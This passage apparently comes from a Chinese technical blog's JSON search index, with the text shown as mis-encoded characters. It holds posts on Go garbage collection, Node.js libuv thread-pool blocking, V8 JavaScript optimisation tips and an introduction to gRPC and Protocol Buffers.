çš„ï¼Œå¹³å‡ 60 - 90 å¾®ç§’ï¼š ä¸€æ—¦ GC å®Œæˆï¼Œgoroutine ç»§ç»­æ‰§è¡Œï¼š ","date":"2019-09-25","objectID":"/gc/:1:3","tags":["Golang"],"title":"Go åƒåœ¾å›æ”¶","uri":"/gc/"},{"categories":["Golang"],"content":"Sweeping - Concurrent Sweepingï¼ˆæ¸…é™¤ï¼‰éœ€è¦ç­‰å¾… collection å®Œæˆä¹‹åï¼Œå›æ”¶è¢«æ ‡è®°ä¸ºæœªä½¿ç”¨çš„å€¼çš„å†…å­˜ï¼Œè¿™ä¸ªè¿‡ç¨‹å‘ç”Ÿåœ¨åº”ç”¨ç¨‹åº goroutine å°è¯•ç»™æ–°å€¼åˆ†é…å†…å­˜ç©ºé—´æ—¶ï¼ŒSweeping çš„å»¶è¿Ÿå°†ä¼šå¢åŠ å†…å­˜åˆ†é…çš„æˆæœ¬ã€‚ ","date":"2019-09-25","objectID":"/gc/:1:4","tags":["Golang"],"title":"Go åƒåœ¾å›æ”¶","uri":"/gc/"},{"categories":["Golang"],"content":"å»¶è¿Ÿä¼˜åŒ– è™½ç„¶ Go çš„ GC å¾ˆä¼˜ç§€ï¼Œä½†æ­£å¦‚å‰æ–‡æ‰€è¿°ï¼ŒGC çš„å»¶è¿Ÿè¿˜æ˜¯ä¼šæ‹–ç´¯åº”ç”¨ç¨‹åºçš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬åœ¨åº”ç”¨ç¨‹åºä¸­å¯ä»¥è¿›è¡Œæ€ä¹ˆçš„ä¼˜åŒ–å‘¢ï¼Ÿ ç­”æ¡ˆæ˜¯é™ä½å†…å­˜çš„å‹åŠ›å³åˆ†é…å†…å­˜çš„é¢‘ç‡ï¼Œæ¯”å¦‚ä½¿ç”¨ slice æ—¶ï¼Œå°½é‡é¿å…å› ä¸ºå®¹é‡ä¸å¤Ÿäº†è€Œå¯¼è‡´åˆ†é…æ›´å¤šçš„å†…å­˜çš„é¢‘ç‡ã€‚ å¦‚ä½•è°ƒè¯•æˆ‘ä»¬çš„ç¨‹åºå»å‘ç°éœ€è¦ä¼˜åŒ–çš„åœ°æ–¹ï¼Ÿ 1ã€å¼€å¯ gotrace è¿½è¸ªå„ç§æŒ‡æ ‡ï¼š GODEBUG=gctrace=1 é€šè¿‡æŒ‡æ ‡æ•°æ®å¯ä»¥çœ‹åˆ°å„ä¸ªè¿‡ç¨‹åŠè€—æ—¶æƒ…å†µï¼Œæ¯”å¦‚ï¼š 2ã€ä½¿ç”¨ pprof å…·ä½“ç”¨æ³•è¯·è‡ªè¡Œå‚è€ƒå…¶å®ƒèµ„æ–™ã€‚ ","date":"2019-09-25","objectID":"/gc/:2:0","tags":["Golang"],"title":"Go åƒåœ¾å›æ”¶","uri":"/gc/"},{"categories":["Golang"],"content":"å‚è€ƒèµ„æ–™ https://www.ardanlabs.com/blog/2018/12/garbage-collection-in-go-part1-semantics.html https://www.ardanlabs.com/blog/2019/05/garbage-collection-in-go-part2-gctraces.html https://www.ardanlabs.com/blog/2019/07/garbage-collection-in-go-part3-gcpacing.html ","date":"2019-09-25","objectID":"/gc/:3:0","tags":["Golang"],"title":"Go åƒåœ¾å›æ”¶","uri":"/gc/"},{"categories":["Uncate"],"content":"CPU å¯†é›†å‹ä»»åŠ¡ä¼šé˜»å¡ Node.js å—ã€è¯‘ã€‘","date":"2019-09-24","objectID":"/nodejs-thread-block/","tags":["Node.js"],"title":"CPU å¯†é›†å‹ä»»åŠ¡ä¼šé˜»å¡ Node.js å—ã€è¯‘ã€‘","uri":"/nodejs-thread-block/"},{"categories":["Uncate"],"content":"æœ¬æ–‡ç¿»è¯‘è‡ªï¼š https://betterprogramming.pub/is-node-js-really-single-threaded-7ea59bcc8d64 CPUå¯†é›†å‹ä»»åŠ¡ä¼šé˜»å¡ Node.js å—ï¼Ÿ è®©æˆ‘ä»¬ä½¿ç”¨åŠ å¯†ä»»åŠ¡åšä¸ªç®€å•æµ‹è¯•ï¼š å¦‚å›¾æ‰€ç¤ºï¼Œè¿ç»­æ‰§è¡Œå››æ¬¡åŠ å¯†ä»»åŠ¡ï¼Œæ‰“å°è€—æ—¶ï¼Œç»“æœä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿ ç»“æœè¾“å‡ºï¼š Hash: 1232 Hash: 1237 Hash: 1268 Hash: 1297 è¿™å››æ¬¡åŠ å¯†ä»»åŠ¡è®¡æ—¶çš„èµ·å§‹æ—¶é—´éƒ½æ˜¯ç›¸åŒçš„ï¼Œç„¶åæœ€ç»ˆçš„ç»“æŸæ—¶é—´å´å‡ ä¹ä¸€è‡´ï¼Œè¿™ä¸ªç»“æœè¯´æ˜äº†ä»€ä¹ˆï¼Ÿè¯´æ˜å®ƒä»¬æ˜¯å¹¶å‘æ‰§è¡Œçš„ã€‚ å¦‚æœä¸æ˜¯å¹¶å‘æ‰§è¡Œï¼Œé‚£ä¹ˆç»“æœå°±ä¼šå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š é‚£ä¹ˆä¸ºä»€ä¹ˆè¿™é‡Œæ²¡æœ‰å‘ç”Ÿé˜»å¡ï¼Ÿ Node.js çš„æ‰§è¡Œè¿‡ç¨‹å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œæˆ‘ä»¬è¦æ³¨æ„çš„æ˜¯ libuv é»˜è®¤ä½¿ç”¨äº†å››ä¸ªçº¿ç¨‹ï¼ä¸Šè¿°ç¤ºä¾‹ä¸­çš„å››ä¸ªåŠ å¯†ä»»åŠ¡åˆ†åˆ«æ¨é€åˆ°äº†å››ä¸ªä¸åŒçš„çº¿ç¨‹ä¸­å»å¹¶å‘æ‰§è¡Œï¼Œæ‰€ä»¥æ‰æ²¡æœ‰å‘ç”Ÿé˜»å¡ã€‚ é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Ÿå¦‚æœè¿ç»­æ‰§è¡Œäº”ä¸ªåŠ å¯†ä»»åŠ¡å‘¢ï¼Ÿ è¾“å‡ºç»“æœï¼š Hash: 1432 Hash: 1437 Hash: 1468 Hash: 1497 Hash: 2104 å¯ä»¥çœ‹åˆ°å‰å››ä¸ªä»»åŠ¡ä»ç„¶æ˜¯å¹¶å‘æ‰§è¡Œçš„ï¼Œä½†æ˜¯ç¬¬äº”ä¸ªä»»åŠ¡å‘ç”Ÿäº†é˜»å¡ã€‚ ä¸ºä»€ä¹ˆï¼Ÿå› æ­¤ libuv çš„å››ä¸ªçº¿ç¨‹éƒ½åœ¨å¿™ç¢Œï¼Œç¬¬äº”ä¸ªä»»åŠ¡åªæœ‰ç­‰å¾…çº¿ç¨‹çš„ä»»åŠ¡æ‰§è¡Œå®Œæ¯•æ‰èƒ½æ¨é€åˆ°çº¿ç¨‹ä¸­å»æ‰§è¡Œã€‚ è¿‡ç¨‹å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š 1ã€å››ä¸ªçº¿ç¨‹éƒ½åœ¨å¿™ç¢Œï¼Œå…¶å®ƒä»»åŠ¡å¿…é¡»ç­‰å¾…ï¼š 2ã€æŸä¸ªçº¿ç¨‹ä»»åŠ¡å®Œæˆï¼Œç»§ç»­æ‰§è¡Œå…¶å®ƒä»»åŠ¡ï¼š libuv çº¿ç¨‹æ± ä¸­çš„çº¿ç¨‹æ•°é‡æ˜¯å¦å¯ä»¥è®¾ç½®ï¼Ÿ é€šè¿‡ç¯å¢ƒå˜é‡ UV_THREADPOOL_SIZE å³å¯è®¾ç½®ã€‚ æ¯”å¦‚ï¼š æˆ‘æŠŠçº¿ç¨‹æ•°è®¾ç½®ä¸º 5 ï¼Œæ‰§è¡Œçš„ç»“æœå°±ä¼šæ˜¯ä¸‹å›¾æ‰€ç¤ºï¼š è¯·æ³¨æ„æµ‹è¯•ç¯å¢ƒçš„ CPU æ ¸å¿ƒæ•°æ˜¯å››ä¸ªï¼Œéœ€è¦è¯´æ˜çš„æœ‰ä¸¤ç‚¹ï¼šç¬¬ä¸€ï¼Œäº”ä¸ªä»»åŠ¡è¢«æ¨é€åˆ°äº†äº”ä¸ªçº¿ç¨‹ä¸­å»å¹¶å‘æ‰§è¡Œï¼Œè¿™ä¸€ç‚¹ä¸Šæ–‡å·²ç»è¯´æ˜ï¼›ç¬¬äºŒï¼Œæ¯ä¸ªä»»åŠ¡çš„è€—æ—¶æœ‰äº†æ˜æ˜¾çš„å¢åŠ ï¼Œä¸ºä»€ä¹ˆï¼Ÿå› ä¸ºæˆ‘ä»¬åªæœ‰å››æ ¸ï¼Œä½†æ˜¯å´æœ‰äº”ä¸ªçº¿ç¨‹ï¼Œæ“ä½œç³»ç»Ÿéœ€è¦è¿›è¡Œå¹³è¡¡è°ƒåº¦ã€é€šè¿‡ä¸Šä¸‹æ–‡åˆ‡æ¢ä»¥ä¿è¯æ¯ä¸ªçº¿ç¨‹åˆ†é…åˆ°ç›¸åŒçš„æ—¶é—´å»æ‰§è¡Œä»»åŠ¡ã€‚ ","date":"2019-09-24","objectID":"/nodejs-thread-block/:0:0","tags":["Node.js"],"title":"CPU å¯†é›†å‹ä»»åŠ¡ä¼šé˜»å¡ Node.js å—ã€è¯‘ã€‘","uri":"/nodejs-thread-block/"},{"categories":["Node.js"],"content":"ä» V8 ä¼˜åŒ–çœ‹é«˜æ•ˆ JavaScriptã€è¯‘ã€‘","date":"2019-09-18","objectID":"/efficient-js-from-v8-optimization/","tags":[],"title":"ä» V8 ä¼˜åŒ–çœ‹é«˜æ•ˆ JavaScriptã€è¯‘ã€‘","uri":"/efficient-js-from-v8-optimization/"},{"categories":["Node.js"],"content":"æ–‡æœ¬ç¿»è¯‘è‡ª: https://blog.logrocket.com/how-javascript-works-optimizing-the-v8-compiler-for-efficiency ç†è§£ JavaScript æ˜¯å¦‚ä½•å·¥ä½œçš„å¯¹äºç¼–å†™é«˜æ•ˆçš„ JS å¤§æœ‰å¸®åŠ©ã€‚ V8 æ‰§è¡Œ JS åˆ†ä¸ºä¸‰ä¸ªé˜¶æ®µï¼š æºä»£ç è½¬æ¢ä¸º AST æŠ½è±¡è¯­æ³•æ ‘ã€‚ è¯­æ³•æ ‘è½¬æ¢ä¸ºå­—èŠ‚ç ï¼šè¿™ä¸ªè¿‡ç¨‹ç”± V8 çš„ Ignition å®Œæˆï¼Œ2017å¹´ä¹‹å‰æ˜¯æ²¡æœ‰çš„ã€‚ å­—èŠ‚ç ç¼–è¯‘æˆæœºå™¨ç ï¼šç”± V8 çš„ç¼–è¯‘å™¨ TurboFan æ¥å®Œæˆã€‚ ç¬¬ä¸€ä¸ªé˜¶æ®µå¹¶ä¸æ˜¯æ–‡æœ¬çš„è®¨è®ºèŒƒå›´ï¼Œç¬¬äºŒä¸‰é˜¶æ®µå¯¹äºç¼–å†™ä¼˜åŒ– JS æœ‰ç›´æ¥å½±å“ã€‚ å®é™…ä¸Šç¬¬äºŒä¸‰é˜¶æ®µæ˜¯ç´§è€¦åˆçš„ï¼Œå®ƒä»¬éƒ½åœ¨ just-in-timeï¼ˆ JIT ï¼‰å†…è¿ä½œã€‚ä¸ºäº†ç†è§£ JIT ï¼Œæˆ‘ä»¬å…ˆå›é¡¾ä¸‹æºä»£ç è½¬æ¢ä¸ºæœºå™¨ç çš„ä¸¤ç§æ–¹æ³•ï¼š 1ã€è§£é‡Šå™¨ è§£é‡Šå™¨é€è¡Œè½¬æ¢å’Œæ‰§è¡Œä»£ç ï¼Œå…¶ä¼˜ç‚¹æ˜¯æ˜“äºå®ç°å’Œç†è§£ã€åŠæ—¶åé¦ˆã€æ›´å®½æ³›çš„ç¼–ç¨‹ç¯å¢ƒï¼Œç¼ºç‚¹ä¹Ÿéå¸¸æ˜æ˜¾ï¼Œé‚£å°±æ˜¯é€Ÿåº¦æ…¢ï¼Œæ…¢çš„åŸå› åœ¨äºï¼ˆ1ï¼‰åå¤è§£é‡Šçš„å¼€é”€å’Œï¼ˆ2ï¼‰æ— æ³•ä¼˜åŒ–ç¨‹åºçš„å„ä¸ªéƒ¨åˆ†ã€‚ æ¢å¥è¯è¯´ï¼Œè§£é‡Šå™¨åœ¨å¤„ç†ä¸åŒçš„ä»£ç æ®µæ—¶æ— æ³•è¯†åˆ«é‡å¤çš„å·¥ä½œé‡ã€‚å¦‚æœä½ é€šè¿‡è§£é‡Šå™¨è¿è¡Œç›¸åŒçš„ä»£ç  100 æ¬¡ï¼Œé‚£ä¹ˆè§£é‡Šå™¨å°†ä¼šç¿»è¯‘å¹¶æ‰§è¡Œç›¸åŒçš„ä»£ç  100 æ¬¡ï¼Œå…¶ä¸­ä¸å¿…è¦çš„é‡æ–°ç¿»è¯‘äº† 99 æ¬¡ã€‚ è§£é‡Šå™¨å¾ˆç®€å•ã€å¯åŠ¨å¿«é€Ÿï¼Œä½†æ‰§è¡Œé€Ÿåº¦æ…¢ã€‚ 2ã€ç¼–è¯‘å™¨ ç¼–è¯‘å™¨åœ¨æ‰§è¡Œä¹‹å‰ç¿»è¯‘æ‰€æœ‰çš„æºä»£ç ã€‚ç¼–è¯‘å™¨æ›´åŠ å¤æ‚ï¼Œä½†æ˜¯å¯ä»¥è¿›è¡Œå…¨å±€ä¼˜åŒ–ï¼ˆä¾‹å¦‚ï¼Œå…±äº«é‡å¤ä»£ç ï¼‰ï¼Œå…¶æ‰§è¡Œé€Ÿåº¦ä¹Ÿæ›´å¿«ã€‚ ç¼–è¯‘å™¨æ›´å¤æ‚ã€å¯åŠ¨æ…¢ï¼Œä½†æ‰§è¡Œé€Ÿåº¦æ›´å¿«ã€‚ JIT çš„ä½œç”¨å°±æ˜¯å°½å¯èƒ½ç»“åˆè§£é‡Šå™¨å’Œç¼–è¯‘å™¨çš„ä¼˜ç‚¹ï¼Œä»¥ä½¿ç¿»è¯‘ä»£ç å’Œæ‰§è¡Œéƒ½èƒ½å¿«é€Ÿã€‚ åŸºæœ¬æ€æƒ³æ˜¯å°½å¯èƒ½é¿å…é‡æ–°ç¿»è¯‘ã€‚é¦–å…ˆï¼Œæ¢æµ‹å™¨é€šè¿‡è§£é‡Šå™¨è¿è¡Œä»£ç ï¼Œåœ¨æ‰§è¡ŒæœŸé—´ï¼Œæ¢æµ‹å™¨ä¼šè¿½è¸ªä»£ç æ®µå¹¶å°†å…¶ä¼šè¢«åˆ’åˆ†ä¸º warmï¼ˆè¿è¡Œå°‘æ•°å‡ æ¬¡ï¼‰ å’Œ hotï¼ˆè¿è¡Œé‡å¤å¤šæ¬¡ï¼‰ã€‚ JIT æŠŠ warm ä»£ç æ®µç›´æ¥ä¸¢ç»™åŸºå‡†ç¼–è¯‘å™¨ï¼Œå°½å¯èƒ½é‡ç”¨å·²ç¼–è¯‘çš„ä»£ç ã€‚ JIT æŠŠ hot ä»£ç æ®µä¸¢ç»™ä¼˜åŒ–ç¼–è¯‘å™¨ï¼Œå…¶æ ¹æ®è§£é‡Šå™¨æ”¶é›†æ¥çš„ä¿¡æ¯ï¼ˆ1ï¼‰ä½œå‡ºå‡è®¾ï¼Œï¼ˆ2ï¼‰åŸºäºå‡è®¾ï¼ˆæ¯”å¦‚ï¼Œå¯¹è±¡å±æ€§å§‹ç»ˆä»¥ç‰¹å®šé¡ºåºå‡ºç°ï¼‰è¿›è¡Œä¼˜åŒ–ã€‚ ç„¶è€Œï¼Œä¸€æ—¦å‡è®¾ä¸æˆç«‹ï¼Œä¼˜åŒ–ç¼–è¯‘å™¨å°±ä¼šè¿›è¡Œ deoptimization å»ä¼˜åŒ–ï¼Œå°±æ˜¯ä¸¢å¼ƒä¼˜åŒ–çš„ä»£ç ã€‚ ä¼˜åŒ–å’Œå»ä¼˜åŒ–çš„å‘¨æœŸæ˜¯æ˜‚è´µçš„ã€‚ç”±äºéœ€è¦å­˜å‚¨ä¼˜åŒ–è¿‡çš„æœºå™¨ç å’Œæ¢æµ‹å™¨çš„ä¿¡æ¯ï¼ŒJIT å¼•å…¥äº†é¢å¤–çš„å†…å­˜æˆæœ¬ã€‚è¿™ç§æˆæœ¬æ¿€å‘äº† V8 çš„è§£é‡Šå™¨ Ignition ã€‚ Ignition å°† AST è½¬æ¢ä¸ºå­—èŠ‚ç ï¼Œå­—èŠ‚ç åºåˆ—è¢«æ‰§è¡Œï¼Œå…¶åé¦ˆä¿¡æ¯è¢« inline caches å†…è”é«˜é€Ÿç¼“å­˜ã€‚ åé¦ˆä¿¡æ¯è¢«ç”¨äºï¼ˆ1ï¼‰Ignition éšåçš„è§£é‡Šï¼Œå’Œï¼ˆ2ï¼‰TurboFan æ¨æµ‹æ€§ä¼˜åŒ–ã€‚ TurboFan åŸºäºåé¦ˆæ¨æµ‹æ€§çš„ä¼˜åŒ–å°†å­—èŠ‚ç è½¬æ¢ä¸ºæœºå™¨ç ã€‚ ","date":"2019-09-18","objectID":"/efficient-js-from-v8-optimization/:0:0","tags":[],"title":"ä» V8 ä¼˜åŒ–çœ‹é«˜æ•ˆ JavaScriptã€è¯‘ã€‘","uri":"/efficient-js-from-v8-optimization/"},{"categories":["Node.js"],"content":"å¦‚ä½•ä¼˜åŒ–ä½ çš„ JavaScript ","date":"2019-09-18","objectID":"/efficient-js-from-v8-optimization/:1:0","tags":[],"title":"ä» V8 ä¼˜åŒ–çœ‹é«˜æ•ˆ JavaScriptã€è¯‘ã€‘","uri":"/efficient-js-from-v8-optimization/"},{"categories":["Node.js"],"content":"1ã€åœ¨æ„é€ å‡½æ•°ä¸­å£°æ˜å¯¹è±¡å±æ€§ æ”¹å˜å¯¹è±¡çš„å±æ€§å°†ä¼šå¯¼è‡´æ–°çš„éšè—ç±»ï¼š class Point { constructor(x, y) { this.x = x; this.y = y; } } var p1 = new Point(11, 22); // hidden class Point created var p2 = new Point(33, 44); p1.z = 55; // another hidden class Point created æœ¬æ¥ p1 å’Œ p2 åº”è¯¥ä½¿ç”¨çš„æ˜¯åŒä¸€ä¸ªéšè—ç±»ï¼Œä½†æ˜¯ç”±äº p1.z çš„åŸå› å°†ä¼šå¯¼è‡´å®ƒä»¬ä½¿ç”¨ä¸åŒçš„éšè—ç±»ï¼Œè¿™å°†å¯¼è‡´ TurboFan çš„å»ä¼˜åŒ–ï¼Œè¿™æ˜¯åº”è¯¥é¿å…çš„ã€‚ ","date":"2019-09-18","objectID":"/efficient-js-from-v8-optimization/:1:1","tags":[],"title":"ä» V8 ä¼˜åŒ–çœ‹é«˜æ•ˆ JavaScriptã€è¯‘ã€‘","uri":"/efficient-js-from-v8-optimization/"},{"categories":["Node.js"],"content":"2ã€ä¿æŒå¯¹è±¡å±æ€§æ’åºä¸å˜ æ”¹å˜å¯¹è±¡å±æ€§çš„æ’åºä¹Ÿå°†ä¼šå¯¼è‡´æ–°çš„éšè—ç±»ï¼š const a1 = { a: 1 }; # hidden class a1 created a1.b = 3; const a2 = { b: 3 }; # different hidden class a2 created a2.a = 1; ä¿æŒå¯¹è±¡å±æ€§çš„æ’åºæœ‰åˆ©äºé‡ç”¨ç›¸åŒçš„éšè—ç±»ï¼Œæ•ˆç‡æ›´é«˜ã€‚ ","date":"2019-09-18","objectID":"/efficient-js-from-v8-optimization/:1:2","tags":[],"title":"ä» V8 ä¼˜åŒ–çœ‹é«˜æ•ˆ JavaScriptã€è¯‘ã€‘","uri":"/efficient-js-from-v8-optimization/"},{"categories":["Node.js"],"content":"3ã€æ³¨æ„å‡½æ•°çš„å‚æ•°ç±»å‹ å‡½æ•°å‚æ•°ç±»å‹çš„æ›´æ”¹ä¹Ÿå°†ä¼šå¯¼è‡´å»ä¼˜åŒ–å’Œé‡æ–°ä¼˜åŒ–ï¼š function add(x, y) { return x + y } add(1, 2); # monomorphic add(\"a\", \"b\"); # polymorphic add(true, false); add([], []); add({}, {}); # megamorphic æ¯”å¦‚è¿™ä¸ªå‡½æ•°ï¼Œç”±äºå‚æ•°ç±»å‹çš„æ˜“å˜å°†ä¼šå¯¼è‡´ç¼–è¯‘å™¨æ— æ³•ä¼˜åŒ–ã€‚ ","date":"2019-09-18","objectID":"/efficient-js-from-v8-optimization/:1:3","tags":[],"title":"ä» V8 ä¼˜åŒ–çœ‹é«˜æ•ˆ JavaScriptã€è¯‘ã€‘","uri":"/efficient-js-from-v8-optimization/"},{"categories":["Node.js"],"content":"4ã€åœ¨ script åŸŸå£°æ˜ç±» ä¸è¦åœ¨å‡½æ•°èŒƒå›´å†…å®šä¹‰ç±»ï¼š function createPoint(x, y) { class Point { constructor(x, y) { this.x = x; this.y = y; } } return new Point(x, y); } function length(point) { ... } è¿™ä¸ªå‡½æ•°æ¯è¢«è°ƒç”¨ä¸€æ¬¡ï¼Œä¸€ä¸ªæ–°çš„åŸå‹å°±è¢«ä¼šåˆ›å»ºï¼Œæ¯ä¸ªæ–°çš„åŸå‹éƒ½ä¼šå¯¹åº”ä¸€ä¸ªæ–°çš„å¯¹è±¡ shape ï¼Œè¿™ä¹Ÿæ˜¯æ— æ³•ä¼˜åŒ–çš„ã€‚ ","date":"2019-09-18","objectID":"/efficient-js-from-v8-optimization/:1:4","tags":[],"title":"ä» V8 ä¼˜åŒ–çœ‹é«˜æ•ˆ JavaScriptã€è¯‘ã€‘","uri":"/efficient-js-from-v8-optimization/"},{"categories":["Node.js"],"content":"5ã€ä½¿ç”¨ for ... in for ... in å¾ªç¯æ˜¯ V8 å¼•æ“ç‰¹åˆ«ä¼˜åŒ–è¿‡çš„ï¼Œå¯ä»¥å¿« 4 åˆ° 6 å€ã€‚ ","date":"2019-09-18","objectID":"/efficient-js-from-v8-optimization/:1:5","tags":[],"title":"ä» V8 ä¼˜åŒ–çœ‹é«˜æ•ˆ JavaScriptã€è¯‘ã€‘","uri":"/efficient-js-from-v8-optimization/"},{"categories":["Node.js"],"content":"6ã€ä¸ç›¸å…³çš„å­—ç¬¦ä¸ä¼šå½±å“æ€§èƒ½ æ—©æœŸä½¿ç”¨çš„æ˜¯å‡½æ•°çš„å­—èŠ‚è®¡æ•°æ¥ç¡®å®šæ˜¯å¦å†…è”å‡½æ•°ï¼Œä½†æ˜¯ç°åœ¨ä½¿ç”¨çš„æ˜¯ AST çš„èŠ‚ç‚¹æ•°é‡æ¥ç¡®å®šå‡½æ•°çš„å¤§å°ã€‚è¿™å°±æ˜¯è¯´ï¼Œè¯¸å¦‚ç©ºæ ¼ã€æ³¨é‡Šã€å˜é‡åç§°é•¿åº¦ã€å‡½æ•°ç­¾åä¹‹ç±»çš„ä¸ç›¸å…³å­—ç¬¦ä¸ä¼šå½±å“å‡½æ•°çš„æ€§èƒ½ã€‚ ","date":"2019-09-18","objectID":"/efficient-js-from-v8-optimization/:1:6","tags":[],"title":"ä» V8 ä¼˜åŒ–çœ‹é«˜æ•ˆ JavaScriptã€è¯‘ã€‘","uri":"/efficient-js-from-v8-optimization/"},{"categories":["Node.js"],"content":"7ã€Try / catch / finally å¹¶ä¸æ˜¯æ¯ç­æ€§çš„ Try ä»¥å‰ä¼šå¯¼è‡´æ˜‚è´µçš„ä¼˜åŒ–å’Œå»ä¼˜åŒ–å¾ªç¯ï¼Œä½†æ˜¯ç°åœ¨å¹¶ä¸ä¼šå¯¼è‡´æ˜æ˜¾çš„æ€§èƒ½å½±å“ã€‚ æ–‡æœ¬ç¿»è¯‘æœ‰éƒ¨åˆ†åˆ å‡ï¼Œå…¨éƒ¨å†…å®¹å¯æŸ¥çœ‹åŸå§‹æ–‡ç« ã€‚ ","date":"2019-09-18","objectID":"/efficient-js-from-v8-optimization/:1:7","tags":[],"title":"ä» V8 ä¼˜åŒ–çœ‹é«˜æ•ˆ JavaScriptã€è¯‘ã€‘","uri":"/efficient-js-from-v8-optimization/"},{"categories":["Golang"],"content":"å¾®æœåŠ¡äº’é€šçš„æ¡¥æ¢: gRPC å…¥é—¨ç¤ºä¾‹","date":"2019-08-23","objectID":"/grpc/","tags":["Golang"],"title":"å¾®æœåŠ¡äº’é€šçš„æ¡¥æ¢: gRPC å…¥é—¨ç¤ºä¾‹","uri":"/grpc/"},{"categories":["Golang"],"content":"RPC æ˜¯ä»€ä¹ˆï¼ŸRemote Procedure Call ï¼Œè¿œç¨‹è¿‡ç¨‹è°ƒç”¨ï¼Œä¸€ç§é€šä¿¡åè®®ã€‚ä½ å¯ä»¥ç†è§£ä¸ºï¼Œåœ¨æŸå°æœºå™¨ä¸Šè°ƒç”¨å¦å¤–ä¸€å°æœºå™¨ä¸Šçš„æœåŠ¡æˆ–æ–¹æ³•ã€‚ åº”ç”¨æœåŠ¡å¯¹å¤–å¯ä»¥æä¾› REST æ¥å£ä»¥ä¾›è¿›è¡ŒæœåŠ¡çš„è°ƒç”¨ï¼Œé‚£ä¹ˆå¯¹äºåˆ†å¸ƒå¼ç³»ç»Ÿå†…éƒ¨çš„å¾®æœåŠ¡ä¹‹é—´çš„ç›¸äº’è°ƒç”¨å‘¢ï¼ŸREST çš„æ–¹å¼ä»ç„¶å¯è¡Œï¼Œä½†æ˜¯æ•ˆç‡ä¸é«˜ï¼Œå› æ­¤ RPC å‡ºç°äº†ã€‚ gRPC æ˜¯è°·æ­Œå¼€æºçš„ä¸€å¥— RPC å®ç°æœºåˆ¶ï¼Œä½å»¶è¿Ÿã€é«˜æ€§èƒ½ï¼Œå…¶åŸºäº HTTP/2 å’Œ Protocol Buffers ã€‚HTTP/2 åœ¨ç°è¡Œ HTTP/1.1 çš„åŸºç¡€ä¸Šè¿›è¡Œäº†å¤§é‡ä¼˜åŒ–ï¼Œæ¯”å¦‚ç”±æ–‡æœ¬ä¼ è¾“å˜ä¸ºäºŒè¿›åˆ¶ä¼ è¾“ï¼ŒåŒæ—¶å…·æœ‰å¤šè·¯å¤ç”¨ã€åŒå‘æµç­‰ç­‰ç‰¹ç‚¹ï¼Œæ€»ä¹‹å°±æ˜¯æ›´ç‰›äº†ã€‚Protocol Buffers æ˜¯ä¸€ä¸ªåºåˆ—åŒ–æˆ–ååºåˆ—åŒ–æ•°æ®çš„åè®®ï¼Œè¯´ç™½äº†å°±æ˜¯æ–‡æœ¬æ•°æ®ä¸äºŒè¿›åˆ¶æ•°æ®ä¹‹é—´çš„ç›¸äº’è½¬æ¢ã€‚ æ–‡æœ¬å°†ä¼šå¸¦ä½ å…¥é—¨ gRPC ï¼Œå¹¶ä¸”æä¾› Node.js å’Œ Go ä¸¤ä¸ªç‰ˆæœ¬çš„ç¤ºä¾‹ã€‚ ","date":"2019-08-23","objectID":"/grpc/:0:0","tags":["Golang"],"title":"å¾®æœåŠ¡äº’é€šçš„æ¡¥æ¢: gRPC å…¥é—¨ç¤ºä¾‹","uri":"/grpc/"},{"categories":["Golang"],"content":"Protocol Buffers æœåŠ¡ä¹‹é—´ç›¸äº’è°ƒç”¨éœ€è¦å®šä¹‰ç»Ÿä¸€çš„æ•°æ®æ ¼å¼ï¼ˆæ¯”å¦‚è¯·æ±‚å’Œå“åº”ï¼‰ï¼ŒåŒæ—¶è¿˜è¦å£°æ˜å…·ä½“çš„æœåŠ¡åŠå…¶æ–¹æ³•ï¼Œå› æ­¤æˆ‘ä»¬é¦–å…ˆè¦åšçš„å°±æ˜¯å®šä¹‰ä¸€ä¸ª .proto åç¼€çš„æ–‡ä»¶ã€‚ ç¤ºä¾‹ï¼š 1ã€syntax å£°æ˜ä½¿ç”¨çš„ protocol buffers åè®®ç‰ˆæœ¬ï¼Œç°è¡Œçš„æ˜¯ç¬¬ä¸‰ç‰ˆã€‚ 2ã€package å£°æ˜è‡ªå®šä¹‰çš„åŒ…åï¼Œè¿™é‡Œçš„ package å¯ä»¥ç†è§£ä¸º go ä¸­çš„åŒ…ï¼Œæˆ–è€… node.js ä¸­çš„ module ã€‚ 3ã€message å®šä¹‰æ•°æ®æ ¼å¼ï¼Œæ¯”å¦‚è¿™é‡Œçš„ ReqBody æ˜¯è¯·æ±‚çš„æ•°æ®ï¼Œå“åº”ç»“æœåˆ™æ˜¯ UserOrders ï¼Œåç§°éƒ½æ˜¯è‡ªå®šä¹‰çš„ï¼Œmessage å¯ä»¥åµŒå¥—ä½¿ç”¨ï¼Œmessage å†…éƒ¨éœ€è¦å®šä¹‰å…·ä½“çš„å­—æ®µåç§°å’Œæ•°æ®ç±»å‹ï¼Œå­—æ®µéœ€è¦ä» 1 å¼€å§‹ä¾æ¬¡ç¼–å·ï¼Œä½†æ˜¯æšä¸¾ç±»å‹æ¯”è¾ƒç‰¹åˆ«ï¼Œæšä¸¾å€¼ä» 0 å¼€å§‹ç¼–å·ã€‚é€šè¿‡ repeated å£°æ˜æŸä¸ªå­—æ®µå¯ä»¥é‡å¤ï¼Œä¹Ÿå°±æ˜¯è¿™ä¸ªæ•°æ®æ˜¯ä¸€ä¸ªæ•°ç»„çš„å½¢å¼ã€‚ 4ã€service å®šä¹‰æœåŠ¡åç§°ï¼Œrpc å®šä¹‰è¯¥æœåŠ¡ä¸‹å…·ä½“çš„æ–¹æ³•ï¼Œä»¥åŠè¯·æ±‚å’Œå“åº”çš„æ•°æ®æ ¼å¼ã€‚ è¿™ä¸ªç¤ºä¾‹å®šä¹‰çš„æ˜¯ï¼Œæˆ‘æœ‰ä¸€ä¸ªæœåŠ¡å« RPCService ï¼Œè¿™ä¸ªæœåŠ¡æœ‰ä¸€ä¸ªæ–¹æ³•å« QueryUserOrders ï¼Œè°ƒç”¨è¿™ä¸ªæ–¹æ³•éœ€è¦ä¼ é€’çš„è¯·æ±‚æ•°æ®çš„æ ¼å¼æ˜¯ ReqBody ï¼Œå“åº”ç»“æœçš„æ•°æ®æ ¼å¼æ˜¯ UserOrders ã€‚ å¾ˆç®€å•æ˜¯ä¸æ˜¯ï¼Œ.proto åè®®æ–‡ä»¶æ¸…æ™°çš„å®šä¹‰äº† RPC 